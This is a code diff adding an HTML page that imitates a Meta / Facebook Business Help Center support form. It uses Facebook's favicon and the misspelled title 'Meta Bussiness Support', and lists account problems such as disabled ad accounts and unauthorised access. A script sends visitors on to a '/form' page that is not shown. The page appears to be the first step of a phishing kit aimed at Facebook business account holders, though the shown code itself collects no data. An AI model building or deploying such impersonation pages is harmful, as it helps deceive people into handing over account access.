@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link href="https://fonts.googleapis.com/css?family=Inter&display=swap" rel="stylesheet" />
+    <title>Identify Issue | Meta Bussiness Support</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet"
+        integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
+    <style>
+        .header {
+            background-image: url('/images/background.jpg');
+            object-fit: cover;
+            height: 150px;
+        }
+
+        .title {
+            text-align: center;
+            color: white;
+            font-weight: bold;
+            font-family: 'Courier New', Courier, monospace;
+            font-size: small;
+            padding-top: 2rem;
+            padding-bottom: 1rem;
+        }
+
+        .sub-title {
+            text-align: center;
+            color: white;
+            font-size: 28px;
+            font-family: 'Lucida Sans', 'Lucida Sans Regular', 'Lucida Grande', 'Lucida Sans Unicode', Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        .main {
+            background-color: #fff;
+            padding-top: 5rem;
+            max-width: 800px;
+            margin: auto;
+        }
+
+        .info {
+            text-align: center;
+            font-size: 14px;
+            color: gray;
+        }
+
+        .info h3 {
+            color: black;
+            font-size: 14px;
+        }
+
+        .table {
+            border: 1px #80808040 solid;
+            border-radius: 5px;
+            padding: 1rem 1rem;
+            font-size: 14px;
+            margin-top: 3rem;
+        }
+
+        .table span {
+            font-weight: bold;
+        }
+
+        .item {
+            padding: 1rem;
+            border: 1px #adb5bd33 solid;
+            border-radius: 5px;
+            margin: 1rem 0;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="header">
+        <div class="title">
+            Facebook Business Help Center
+        </div>
+        <div class="sub-title">
+            How can we help you?
+        </div>
+    </div>
+
+    <div class="main">
+        <div class="info">
+            <h3>How can we help?</h3>
+            <span class="sub-info">We need more information to address your issue.<br />This form will only take a few
+                minutes.</span>
+        </div>
+
+        <div class="table">
+            <span>Most common issues</span>
+            <div id="error_block" class="item info" style="display: none;"><span
+                    style="color:red; font-weight: bold;">You must select one issue to help us
+                    easily identify your problem.</span></div>
+            <div class="item">
+                <input id="issue_1" name="issue" class="form-check-input me-2" type="radio">
+                <label for="issue_1">I have been blocked from using a feature</label>
+            </div>
+            <div class="item">
+                <input id="issue_2" name="issue" class="form-check-input me-2" type="radio">
+                <label for="issue_2">My fanpage is restricted (not violate policy)</label>
+            </div>
+            <div class="item">
+                <input id="issue_3" name="issue" class="form-check-input me-2" type="radio">
+                <label for="issue_3">My ad account is disabled</label>
+            </div>
+            <div class="item">
+                <input id="issue_4" name="issue" class="form-check-input me-2" type="radio">
+                <label for="issue_4">I need help with a failed payment</label>
+            </div>
+            <div class="item">
+                <input id="issue_5" name="issue" class="form-check-input me-2" type="radio">
+                <label for="issue_5">I think someone accessed my business without my permission</label>
+            </div>
+            <div class="item">
+                <input id="issue_6" name="issue" class="form-check-input me-2" type="radio">
+                <label for="issue_6">Other issues</label>
+            </div>
+            <div class="text-end">
+                <button type="submit" onclick="handleBtnClick()" class="btn btn-primary">Next ></button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function handleBtnClick(buttonId) {
+            if (checkSelected()) {
+                location.href = "/form";
+            } else {
+                document.getElementById('error_block').style = 'display:block;'
+            }
+        }
+
+        function checkSelected() {
+            for (var i = 1; i <= 6; i++) {
+                var ele = document.getElementById('issue_' + i);
+                if (document.getElementById('issue_' + i).checked) {
+                    return true;
+                }
+            }
+            return false;
+        }
+    </script>
+
+</body>
+
+</html>
